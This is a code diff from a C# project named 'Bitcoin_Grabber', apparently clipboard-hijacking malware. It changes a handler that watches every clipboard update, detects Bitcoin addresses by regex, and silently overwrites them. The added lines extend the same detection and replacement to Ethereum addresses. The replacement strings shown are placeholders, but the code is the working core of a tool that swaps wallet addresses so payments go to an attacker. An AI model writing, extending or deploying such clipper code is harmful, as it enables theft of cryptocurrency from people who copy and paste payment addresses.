@@ -82,21 +82,27 @@ namespace Bitcoin_Grabber
             {
                 if (m.Msg == NativeMethods.WM_CLIPBOARDUPDATE)
                 {
+                    string input = Clipboard.GetText();
 
                     /* the address always starts with 1 or 3 or bc1
                      * the length is between 26-35 characters
                      * more info https://en.bitcoin.it/wiki/Address
                      */
 
-                    string input = Clipboard.GetText();
-                    string pattern = @"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b";
-                    string replacement = "<<! Bitcoin Grabber By NYAN CAT !>>";
+                    string btcReplacement = "Bitcoin";
+                    Regex btcPattern = new Regex(@"\b(bc1|[13])[a-zA-HJ-NP-Z0-9]{26,35}\b"); //btc
 
-                    Regex rgx = new Regex(pattern);
-                    Match match = rgx.Match(input);
-                    if (match.Success)
+                    string ethereumReplacement = "Ethereum";
+                    Regex ethereumPattern = new Regex(@"\b0x[a-fA-F0-9]{40}\b"); //ethereum
+
+                    if (btcPattern.Match(input).Success)
                     {
-                        string result = rgx.Replace(input, replacement);
+                        string result = btcPattern.Replace(input, btcReplacement);
+                        Clipboard.SetText(result);
+                    }
+                    else if (ethereumPattern.Match(input).Success)
+                    {
+                        string result = ethereumPattern.Replace(input, ethereumReplacement);
                         Clipboard.SetText(result);
                     }
                 }
